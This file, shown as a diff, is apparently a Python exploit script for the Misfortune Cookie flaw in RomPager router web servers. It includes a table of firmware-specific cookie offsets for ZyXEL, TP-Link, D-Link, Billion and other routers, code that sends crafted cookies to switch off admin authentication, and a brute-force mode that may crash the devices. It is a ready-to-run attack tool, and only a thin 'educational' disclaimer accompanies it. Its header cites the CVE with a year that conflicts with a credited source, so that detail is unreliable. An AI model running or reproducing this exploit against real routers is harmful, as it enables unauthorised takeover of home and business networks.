@@ -1,0 +1,248 @@
+# Title: Misfortune Cookie Exploit (RomPager <= 4.34) router authentication remover
+# Date: 17/4/2016
+# CVE: CVE-2015-9222 (http://mis.fortunecook.ie)
+# Vendors: ZyXEL,TP-Link,D-Link,Nilox,Billion,ZTE,AirLive,...
+# Vulnerable models: http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf 
+# Versions affected: RomPager <= 4.34 (specifically 4.07)
+# Tested on : firmwares which are set as tested in the targets list
+# Category: Remote Exploit
+# Usage: ./exploit.py url
+#	Example: python exploit.py http://192.168.1.1 , python exploit.py https://192.168.1.1:3040
+
+# Author: Milad Doorbash
+# Email: milad.doorbash@gmail.com
+# Social: @doorbash
+# Blog: http://doorbash.ir
+
+# Many Thanks to : 
+# 	Cawan Chui (http://embedsec.systems/embedded-device-security/2015/02/16/Misfortune-Cookie-CVE-2014-9222-Demystified.html)
+#	Piotr Bania (http://piotrbania.com/all/articles/tplink_patch)
+#	Grant Willcox (https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2015/10/porting-the-misfortune-cookie-exploit-whitepaperpdf)
+# 	Chan (http://scz.617.cn/misc/201504141114.txt -- http://www.nsfocus.com.cn/upload/contents/2015/09/2015_09181715274142.pdf)
+
+# Disclaimer :
+#	This exploit is for testing and educational purposes only.Any other usage for this code is not allowed.
+#	Author takes no responsibility for any actions with provided informations or codes.
+
+# Description :
+# 	Misfortune Cookie is a critical vulnerability that allows an intruder to remotely
+# 	take over an Internet router and use it to attack home and business networks.With a few magic
+#	cookies added to your request you bypass any authentication and browse the configuration
+#	interface as admin, from any open port.
+
+import requests
+import sys
+import time
+
+MODE_TEST = 100000
+MODE_BRUTE_FORCE = 100001
+
+if len(sys.argv) == 1:
+	print "usage: python " + sys.argv[0] + " url [enable]"
+	print "example: python exploit.py http://192.168.1.1 , python exploit.py https://192.168.1.1:3040"
+	exit()
+
+url = str(sys.argv[1])
+auth_byte = '\x00'
+s = requests.Session()
+
+if len(sys.argv) == 3:
+	if str(sys.argv[2]) == 'enable':
+		auth_byte = '\x01' # enable authenticaion again
+	else:
+		print "usage: python " + sys.argv[0] + " url [enable]" 
+		exit()
+
+targets = [
+
+	["Azmoon	AZ-D140W		2.11.89.0(RE2.C29)3.11.11.52_PMOFF.1",107367693,13], # 0x803D5A79		# tested
+	["Billion	BiPAC 5102S		Av2.7.0.23 (UE0.B1C)",107369694,13], # 0x8032204d						# ----------
+	["Billion	BiPAC 5102S		Bv2.7.0.23 (UE0.B1C)",107369694,13], # 0x8032204d						# ----------
+	["Billion	BiPAC 5200		2.11.84.0(UE2.C2)3.11.11.6",107369545,9], # 0x803ec2ad					# ----------
+	["Billion	BiPAC 5200		2_11_62_2_ UE0.C2D_3_10_16_0",107371218,21], # 0x803c53e5				# ----------
+	["Billion	BiPAC 5200A		2_10_5 _0(RE0.C2)3_6_0_0",107366366,25], # 0x8038a6e1					# ----------
+	["Billion	BiPAC 5200A		2_11_38_0 (RE0.C29)3_10_5_0",107371453,9], # 0x803b3a51					# ----------
+	["Billion	BiPAC 5200GR4		2.11.91.0(RE2.C29)3.11.11.52",107367690,21], # 0x803D8A51			# tested
+	["Billion	BiPAC 5200S		2.10.5.0 (UE0.C2C) 3.6.0.0",107368270,1], # 0x8034b109					# ----------
+	["Billion	BiPAC 5200SRD		2.12.17.0_UE2.C3_3.12.17.0",107371378,37], # 0x8040587d				# ----------
+	["Billion	BiPAC 5200SRD		2_11_62_2(UE0.C3D)3_11_11_22",107371218,13], # 0x803c49d5			# ----------
+	["D-Link	DSL-2520U	Z1	1.08 DSL-2520U_RT63261_Middle_East_ADSL",107368902,25], # 0x803fea01	# tested
+	["D-Link	DSL-2600U	Z1	DSL-2600U HWZ1",107366496,13], # 0x8040637d								# ----------
+	["D-Link	DSL-2600U	Z2	V1.08_ras",107360133,20], # 0x803389B0									# ----------
+	["TP-Link	TD-8616		V2	TD-8616_v2_080513",107371483,21], # 0x80397055							# ----------
+	["TP-Link	TD-8816		V4	TD-8816_100528_Russia",107369790,17], # 0x803ae0b1						# ----------
+	["TP-Link	TD-8816		V4	TD-8816_V4_100524",107369790,17], # 0x803ae0b1							# ----------
+	["TP-Link	TD-8816		V5	TD-8816_100528_Russia",107369790,17], # 0x803ae0b1						# ----------
+	["TP-Link	TD-8816		V5	TD-8816_V5_100524",107369790,17], # 0x803ae0b1							# tested
+	["TP-Link	TD-8816		V5	TD-8816_V5_100903",107369790,17], # 0x803ae0b1							# ----------
+	["TP-Link	TD-8816		V6	TD-8816_V6_100907",107371426,17], # 0x803c6e09							# ----------
+	["TP-Link	TD-8816		V7	TD-8816_V7_111103",107371161,1], # 0x803e1bd5							# ----------
+	["TP-Link	TD-8816		V7	TD-8816_V7_130204",107370211,5], # 0x80400c85							# ----------
+	["TP-Link	TD-8817		V5	TD-8817_V5_100524",107369790,17], # 0x803ae0b1							# ----------
+	["TP-Link	TD-8817		V5	TD-8817_V5_100702_TR",107369790,17], # 0x803ae0b1						# ----------
+	["TP-Link	TD-8817		V5	TD-8817_V5_100903",107369790,17], # 0x803ae0b1							# ----------
+	["TP-Link	TD-8817		V6	TD-8817_V6_100907",107369788,1], # 0x803b6e09							# ----------
+	["TP-Link	TD-8817		V6	TD-8817_V6_101221",107369788,1], # 0x803b6e09							# ----------
+	["TP-Link	TD-8817		V7	TD-8817_V7_110826",107369522,25], # 0x803d1bd5							# ----------
+	["TP-Link	TD-8817		V7	TD-8817_V7_130217",107369316,21], # 0x80407625							# ----------
+	["TP-Link	TD-8817		V7	TD-8817_v7_120509",107369321,9], # 0x803fbcc5							# tested
+	["TP-Link	TD-8817		V8	TD-8817_V8_140311",107351277,20], # 0x8024E148							# Grant	Willcox	
+	["TP-Link	TD-8820		V3	TD-8820_V3_091223",107369768,17], # 0x80397E69							# Chan
+	["TP-Link	TD-8840T 	V1	TD-8840T_080520",107369845,5], # 0x80387055								# ----------
+	["TP-Link	TD-8840T 	V2	TD-8840T_V2_100525",107369790,17], # 0x803ae0b1							# tested
+	["TP-Link	TD-8840T 	V2	TD-8840T_V2_100702_TR",107369790,17], # 0x803ae0b1						# ----------
+	["TP-Link	TD-8840T 	V2	TD-8840T_v2_090609",107369570,1], # 0x803c65d5							# ----------
+	["TP-Link	TD-8840T 	V3	TD-8840T_V3_101208",107369766,17], #0x803c3e89							# tested	
+	["TP-Link	TD-8840T 	V3	TD-8840T_V3_110221",107369764,5], # 0x803d1a09							# ----------
+	["TP-Link	TD-8840T 	V3	TD-8840T_V3_120531",107369688,17], # 0x803fed35							# ----------
+	["TP-Link	TD-W8101G 	V1	TD-W8101G_090107",107367772,37], # 0x803bf701							# ----------
+	["TP-Link	TD-W8101G 	V1	TD-W8101G_090107",107367808,21], # 0x803e5b6d							# ----------
+	["TP-Link	TD-W8101G 	V2	TD-W8101G_V2_100819",107367751,21], # 0x803dc701						# ----------
+	["TP-Link	TD-W8101G 	V2	TD-W8101G_V2_101015_TR",107367749,13], # 0x803e1829						# ----------
+	["TP-Link	TD-W8101G 	V2	TD-W8101G_V2_101101",107367749,13], # 0x803e1829						# ----------
+	["TP-Link	TD-W8101G 	V3	TD-W8101G_V3_110119",107367765,25], # 0x804bb941						# ----------
+	["TP-Link	TD-W8101G 	V3	TD-W8101G_V3_120213",107367052,25], # 0x804e1ff9						# ----------
+	["TP-Link	TD-W8101G 	V3	TD-W8101G_V3_120604",107365835,1], # 0x804f16a9							# ----------
+	["TP-Link	TD-W8151N	V3	TD-W8151N_V3_120530",107353867,24], # 0x8034F3A4						# tested
+	["TP-Link	TD-W8901G	V1	TD-W8901G_080522",107367787,21], # 0x803AB30D							# Piotr Bania
+	["TP-Link	TD-W8901G	V1,2	TD-W8901G_080522",107368013,5], # 0x803AB30D						# ----------
+	["TP-Link	TD-W8901G	V2	TD-W8901G_090113_Turkish",107368013,5], # 0x803AB30D					# ----------
+	["TP-Link	TD-W8901G	V3	TD-W8901G(UK)_V3_140512",107367854,9], # 0x803cf335						# tested
+	["TP-Link	TD-W8901G	V3	TD-W8901G_V3_100603",107367751,21], # 0x803DC701						# chan
+	["TP-Link	TD-W8901G	V3	TD-W8901G_V3_100702_TR",107367751,21], # 0x803DC701						# tested
+	["TP-Link	TD-W8901G	V3	TD-W8901G_V3_100901",107367749,13], # 0x803E1829						# tested
+	["TP-Link	TD-W8901G	V6	TD-W8901G_V6_110119",107367765,25], # 0x804BB941						# Chan
+	["TP-Link	TD-W8901G	V6	TD-W8901G_V6_110915",107367682,21], # 0x804D7CB9						# Chan
+	["TP-Link	TD-W8901G 	V6	TD-W8901G_V6_120418",107365835,1], # 0x804F16A9							# ----------
+	["TP-Link	TD-W8901G 	V6 	TD-W8901G_V6_120213",107367052,25], # 0x804E1FF9						# ----------
+	["TP-Link	TD-W8901GB	V3	TD-W8901GB_V3_100727",107367756,13], # 0x803dfbe9						# ----------
+	["TP-Link	TD-W8901GB	V3	TD-W8901GB_V3_100820",107369393,21], # 0x803f1719						# ----------
+	["TP-Link	TD-W8901N	V1	TD-W8901N v1_111211",107353880,0],  # 0x8034FF94						# cawan	Chui
+	["TP-Link	TD-W8951ND	V1	TD-TD-W8951ND_V1_101124,100723,100728",107369839,25], # 0x803d2d61		# tested
+	["TP-Link	TD-W8951ND	V1	TD-TD-W8951ND_V1_110907",107369876,13], # 0x803d6ef9 					# ----------
+	["TP-Link	TD-W8951ND	V1	TD-W8951ND_V1_111125",107369876,13], # 0x803d6ef9						# ----------
+	["TP-Link	TD-W8951ND	V3	TD-W8951ND_V3.0_110729_FI",107366743,21], # 0x804ef189					# ----------
+	["TP-Link	TD-W8951ND	V3	TD-W8951ND_V3_110721",107366743,21], # 0x804ee049						# ----------
+	["TP-Link	TD-W8951ND	V3	TD-W8951ND_V3_20110729_FI",107366743,21], # 0x804ef189					# ----------
+	["TP-Link	TD-W8951ND	V4	TD-W8951ND_V4_120511",107364759,25],  # 0x80523979						# tested
+	["TP-Link	TD-W8951ND	V4	TD-W8951ND_V4_120607",107364759,13], # 0x80524A91						# tested
+	["TP-Link	TD-W8951ND	V4	TD-W8951ND_v4_120912_FL",107364760,21], # 0x80523859					# tested
+	["TP-Link	TD-W8961NB	V1	TD-W8961NB_V1_110107",107369844,17], # 0x803de3f1						# tested
+	["TP-Link	TD-W8961NB	V1	TD-W8961NB_V1_110519",107369844,17], # 0x803de3f1						# ----------
+	["TP-Link	TD-W8961NB	V2	TD-W8961NB_V2_120319",107367629,21], # 0x80531859						# ----------
+	["TP-Link	TD-W8961NB	V2	TD-W8961NB_V2_120823",107366421,13], # 0x80542e59						# ----------
+	["TP-Link	TD-W8961ND	V1	TD-W8961ND_V1_100722,101122",107369839,25], # 0x803D2D61				# tested
+	["TP-Link	TD-W8961ND	V1	TD-W8961ND_V1_101022_TR",107369839,25], # 0x803D2D61					# ----------
+	["TP-Link	TD-W8961ND	V1	TD-W8961ND_V1_111125",107369876,13], # 0x803D6EF9						# ----------
+	["TP-Link	TD-W8961ND	V2	TD-W8961ND_V2_120427",107364732,25], # 0x8052e0e9						# ----------
+	["TP-Link	TD-W8961ND	V2	TD-W8961ND_V2_120710_UK",107364771,37], # 0x80523AA9					# ----------
+	["TP-Link	TD-W8961ND	V2	TD-W8961ND_V2_120723_FI",107364762,29], # 0x8052B6B1					# ----------
+	["TP-Link	TD-W8961ND	V3	TD-W8961ND_V3_120524,120808",107353880,0], # 0x803605B4					# ----------
+	["TP-Link	TD-W8961ND	V3	TD-W8961ND_V3_120830",107353414,36], # 0x803605B4						# ----------
+	["ZyXEL	P-660R-T3	V3	3.40(BOQ.0)C0",107369567,21], # 0x803db071									# tested
+	["ZyXEL	P-660RU-T3	V3	3.40(BJR.0)C0",107369567,21], # 0x803db071									# ----------
+	
+
+# *---------- means data for this firmware is obtained from other tested firmwares.
+# if you tested on your devices report to me so i can change them to tested state.
+# don't forget to mention your device model and full firmware version in your reports.
+# I could not gather information for every vulnerable firmwares since some vendors has removed
+# vulnerable/old ones from their websites or add some unknown-yet security mechanisms to the them.
+# if you want to add missing firmwares data to list you can do it by reading blog posts
+# mentioned in "Many thanks to" part at the beginning.Btw please don't hesitate to contact me
+# for any question or further information.
+
+]
+
+def request(num,n,data):
+	try:
+		print "\nConnecting to: " + url + "\n"
+		s.headers.update({"Cookie":"C" + str(num) + "=" + "B"* n + data + ";"})
+		r = s.get(url)
+		print str(r.status_code) + "\n"
+		for i in r.headers:
+			print i + ": " + r.headers[i]
+		return [r.status_code,r.text]
+	except Exception, e:
+		return 1000
+
+
+def printMenu():
+	print """
+         __  __ _      __            _                    
+        |  \/  (_)___ / _| ___  _ __| |_ _   _ _ __   ___ 
+        | |\/| | / __| |_ / _ \| '__| __| | | | '_ \ / _ \			
+        | |  | | \__ \  _| (_) | |  | |_| |_| | | | |  __/				
+        |_|  |_|_|___/_|  \___/|_|   \__|\__,_|_| |_|\___|			
+                                                          
+   ____            _    _        _____            _       _ _   
+  / ___|___   ___ | | _(_) ___  | ____|_  ___ __ | | ___ (_) |_ 
+ | |   / _ \ / _ \| |/ / |/ _ \ |  _| \ \/ / '_ \| |/ _ \| | __|
+ | |__| (_) | (_) |   <| |  __/ | |___ >  <| |_) | | (_) | | |_ 
+  \____\___/ \___/|_|\_\_|\___| |_____/_/\_\ .__/|_|\___/|_|\__|
+                                           |_|                 
+
+----------------------------------------------------------------------------
+"""
+	for k,i in enumerate(targets):
+		print str(k+1) + "- " + i[0]
+
+	print """
+0- Not sure just try them all! (may cause reboot)
+T- Test misfortune cookie vulnerablity against target
+B- BruteForce to find auth-remover cookie (may cause reboot)
+"""
+	c = 0
+	while True:
+		selection = raw_input("select a target: ")
+		if selection == "T":
+			return MODE_TEST
+		elif selection == "B":
+			return MODE_BRUTE_FORCE
+		c = int(selection)
+		if c <= len(targets):
+			break
+		else:
+			print "bad input try again"
+	return c - 1
+
+def bruteforce():
+	for i in range(107364000,107380000):
+		for j in range(0,40):
+			print "testing " + str(i) + " , " + str(j)
+			result = request(i,j,"\x00")[0]
+			if result <= 302:
+				print "YEAHHH!!!!"
+				print str(i) + " , " + str(j) + " is the answer!"
+				return
+			elif result == 1000:
+				time.sleep(60)
+
+def exploit():
+	c = printMenu()
+	if c < 0:
+		for k,i in enumerate(targets):
+			print "testing #" + str(k+1) + " ..."
+			result = request(i[1],i[2],auth_byte)[0]
+			if result == 1000:
+				print "\n[!] Error. maybe router crashed by sending wrong cookie or it's your connection problem.waiting 60 seconds for router to reboot"
+				time.sleep(60)
+			elif result <= 302:
+				print "\n[!] Seems good but check " + url + " using your browser to verify if authentication is disabled or not."
+				break # some routers always return 200 (for custom login page). so maybe we should comment this line
+			else:
+				print "\n[!] Failed."
+	else:
+		if c == MODE_TEST:
+			if "HelloWorld" in request(107373883,0,"/HelloWorld")[1]:
+				print "\n[!] Target is vulnerable"
+			else:
+				print "\n[!] Target is not vulnerable"
+		elif c == MODE_BRUTE_FORCE:
+			bruteforce()
+		elif request(targets[c][1],targets[c][2],auth_byte)[0] > 302:
+			print "\n[!] Failed."
+		else:
+			print "\n[!] Seems good but check " + url + " using your browser to verify if authentication is disabled or not."
+
+exploit()
